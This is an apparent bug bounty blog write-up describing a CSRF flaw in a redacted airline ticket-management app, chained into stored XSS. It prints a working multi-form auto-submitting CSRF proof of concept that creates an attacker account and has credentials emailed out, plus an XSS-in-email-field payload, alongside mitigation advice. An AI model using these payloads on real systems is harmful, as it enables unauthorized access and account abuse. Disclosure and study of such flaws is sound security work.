---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-12_bug-bounty-cross-site-request-forgery-is-a-thing.md
original_filename: 2022-09-12_bug-bounty-cross-site-request-forgery-is-a-thing.md
title: Bug Bounty - Cross-site request forgery is a thing
category: documents
detected_topics:
- csrf
- xss
- command-injection
- otp
tags:
- imported
- documents
- csrf
- xss
- command-injection
- otp
language: en
raw_sha256: 3649bb460a33ef9e7dc837eb086edd9aef26ce29dd29e83de2884de969b307ae
text_sha256: 1d2ee7f59f3b074725bde3beafbe3cf4071a7a4454df85eee910a0b2d824a650
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Bug Bounty - Cross-site request forgery is a thing

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-12_bug-bounty-cross-site-request-forgery-is-a-thing.md
- Source Type: markdown
- Detected Topics: csrf, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `3649bb460a33ef9e7dc837eb086edd9aef26ce29dd29e83de2884de969b307ae`
- Text SHA256: `1d2ee7f59f3b074725bde3beafbe3cf4071a7a4454df85eee910a0b2d824a650`


## Content

---
title: "Bug Bounty - Cross-site request forgery is a thing"
page_title: "Bug Bounty - Cross-site request forgery is a thing ::
  hesec.de — Hacking and Fun"
url: "https://hesec.de/posts/bbh-csrf/"
final_url: "https://hesec.de/posts/bbh-csrf/"
authors: ["Patrick Hener (@C1sc01)"]
bugs: ["CSRF", "XSS"]
bounty: "2,400"
publication_date: "2022-09-12"
added_date: "2022-11-30"
source: "pentester.land/writeups.json"
original_index: 2178
---

Recently I got promoted $2.400 for finding a Cross-site request forgery (CSRF) vulnerability participating in a bug bounty program at [Synack](https://www.synack.com/). I already can hear people say: “This much money for a CSRF finding? How is this even possible?”. In this blog post I want to show you why a CSRF vulnerability still can be a serious issue.

# What is CSRF?

> Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

**Source:[OWASP](https://owasp.org/www-community/attacks/csrf)**

OWASP is describing it just right. A successful CSRF-attack is dependant on user interaction. And also the impact depends on which role the victim is authenticated with. In the case of my finding the CSRF-attack was targeted against an administrative account with severe functionality as I will show below.

In regards of phishing attacks let me tell you this; phising attacks are successful every time. There is no such company which has an awareness level so no user will fall for a sophisticated phishing attack.

# Where did I find it?

Now to the fun part. What did I find? For the sake of not violating terms I will call the company `redacted` and also the domain is going to be `redacted.com`. The company `redacted` has this _ticket limit management_ web application for users of an airline. And within this application there are several roles available, one of which is a administrative role.

As always I was skimming through the app trying to understand how everything is working as I noticed a thing looking at the _burp request history_. All my POST requests which got issued after submitting forms were not protected by any Anti-CSRF token or any other mechanism I knew. I then concentrated on the request which might result in a high impact and found this one action in a path `https://redacted.com/tlm/emailFunction.form?action=`.

This action will enable the admin to do several things:

  1. Add an airline
  2. Add an e-mail address to an airline
  3. Cause an outgoing e-mail with a password
  4. Cause an outgoing e-mail with a secret
  5. Delete an existing e-mail from an airline
  6. Delete an airline all together

So I was all in now. How could I reach the highest impact (besides just reporting every request by its own)? It turns out that an attacker could gain access to the application by chaining steps 1 to 4 in a one click page. How cool is that?

Let me show you the PoC-code I submitted for this:
  
  
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  <html>
  <head>
  <script language="javascript">
  
  window.onload = function() {
  document.getElementById("csrfForm1").submit();
  document.getElementById("csrfForm2").submit();
  document.getElementById("csrfForm3").submit();
  document.getElementById("csrfForm4").submit();
  }
  
  // defeat frame busters
  window.onbeforeunload = function() {
  return "Please click 'Stay on this page' to allow it to finish loading.";
  }
  
  </script>
  </head>
  <body>
  
  <form id="csrfForm1" action="https://redacted.com/tlm/emailFunction.form?action=addairlinedetails&airline=" method="POST" target="csrfIframe1">
  <input type="hidden" name="temp" value="" />
  <input type="hidden" name="airline" value="" />
  <input type="hidden" name="login" value="" />
  <input type="hidden" name="usrtype" value="null" />
  <input type="hidden" name="txtAirline" value="SY" />
  <input type="hidden" name="txtLoginName" value="C1SC0" />
  <input type="hidden" name="selUsrType" value="supervisor" />
  </form>
  
  <form id="csrfForm2" action="https://redacted.com/tlm/emailFunction.form?action=addemaildetails" method="POST" target="csrfIframe2">
  <input type="hidden" name="aa" value="" />
  <input type="hidden" name="login" value="C1SC0" />
  <input type="hidden" name="usrtype" value="supervisor" />
  <input type="hidden" name="airline" value="SY" />
  <input
  type="hidden"
  name="txtEmailAddr"
  value="redacted email"
  />
  <input type="hidden" name="selNotify" value="1" />
  <input type="hidden" name="selReport" value="1" />
  <input type="hidden" name="selKeyGen" value="1" />
  </form>
  
  
  <form id="csrfForm3" action="https://redacted.com/tlm/emailFunction.form" target="csrfIframe3">
  <input type="hidden" name="action" value="genPwd" />
  <input type="hidden" name="airline" value="SY" />
  <input type="hidden" name="login" value="C1SC0" />
  <input type="hidden" name="usrType" value="supervisor" />
  <input type="hidden" name="emailaddr" value="" />
  <input type="hidden" name="notify" value="" />
  <input type="hidden" name="report" value="" />
  <input type="hidden" name="keygen" value="" />
  </form>
  
  <form id="csrfForm4" action="https://redacted.com/tlm/emailFunction.form" target="csrfIframe4">
  <input type="hidden" name="action" value="genSecret" />
  <input type="hidden" name="airline" value="SY" />
  <input type="hidden" name="login" value="C1SC0" />
  <input type="hidden" name="usrType" value="supervisor" />
  <input type="hidden" name="emailaddr" value="" />
  <input type="hidden" name="notify" value="" />
  <input type="hidden" name="report" value="" />
  <input type="hidden" name="keygen" value="" />
  </form>
  
  <!-- hidden iframes -->
  <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe1"></iframe>
  <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe2"></iframe>
  <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe3"></iframe>
  <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe4"></iframe>
  </body>
  </html>
  

Credits go to [lanmaster53.com](https://www.lanmaster53.com/2013/07/17/multi-post-csrf/) which showed how to do it with 2 requests.

As you can see there are 4 requests made, when visiting the page. The first one will issue the action `addairlinedetails`, which will add an airline _C1SC0_. Then the second request will execute the action called `addemaildetails` which will add an email address to the airline. Afterwards the third request will issue the action `genPwd` which will result in a first e-mail being received with credentials to login to the application:

[ ![password is received via e-mail](https://hesec.de/images/bbh-csrf/email-pw.png) ](https://hesec.de/images/bbh-csrf/email-pw.png) The password is received via e-mail

And finally the last request will trigger the action called `genSecret` which will send an e-mail containing a secret which will be used while logging in:

[ ![secret is received via e-mail](https://hesec.de/images/bbh-csrf/secret-pw.png) ](https://hesec.de/images/bbh-csrf/secret-pw.png) The secret is received via e-mail

After that I was able to login on to the application as a regular user.

# Why is this an issue?

The impact is high because with a single successful phising attack an unauthenticated attacker can gain access to the application. The impact is even higher when chaining with a severe other bug the application was suffering from. Be sure to checkout bonus section below.

# How to mitigate this issue?

Mitigation on that issue is quite simple. As this app was written in `java` there are already very good frameworks to tackle this kind of attack. One could use Anti-CSRF implemented in `springboot` for example. Further good reading you could find with [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).

But basically it boils down to using an `anti-csrf` token and checking the `Origin Header` against a whitelist.

# Bonus: CSRF -> PXSS :D

For the bonus I brought a very cool chain which allowed to implement a _stored cross-site scripting_ payload in the application. Right at the beginning of looking at the application I noticed, that the e-mail address which can be added to an airline is also susceptible to **cross-site scripting**. Unfortunately for me and fortunately for them the session cookie was secured with the _httpOnly_ flag, so it cannot be read by using javascript code. This made an account takeover impossible with this attack chain.

Nontheless I also submitted a proof of concept where the victim will release a sequence of requests when visiting a malicious site. The actions are:

  1. Adding an airline
  2. Adding an e-mail address containing a XSS payload

Here is the part which added the malicious e-mail address:
  
  
  <form
  id="csrfForm2"
  action="https://redacted.com/tlm/emailFunction.form?action=addemaildetails"
  method="POST"
  target="csrfIframe2"
  >
  <input type="hidden" name="aa" value="" />
  <input type="hidden" name="login" value="C1SC0" />
  <input type="hidden" name="usrtype" value="supervisor" />
  <input type="hidden" name="airline" value="SY" />
  <input
  type="hidden"
  name="txtEmailAddr"
  value="c1s&lt;script&gt;alert&#40;document.domain&#41;&lt;&#47;script&gt;&#64;test&#46;de"
  />
  <input type="hidden" name="selNotify" value="1" />
  <input type="hidden" name="selReport" value="1" />
  <input type="hidden" name="selKeyGen" value="1" />
  </form>
  

As you can see the payload will just alert the domain name. The value translates to `c1s<script>alert(document.domain)</script>@test.de` after decoding.

[ ![xss is triggered](https://hesec.de/images/bbh-csrf/xss.png) ](https://hesec.de/images/bbh-csrf/xss.png) The XSS payload is triggered

Had that cookie not been flagged correctly this would have been an account take over 🤷 Well, next time. Until then see you guys.
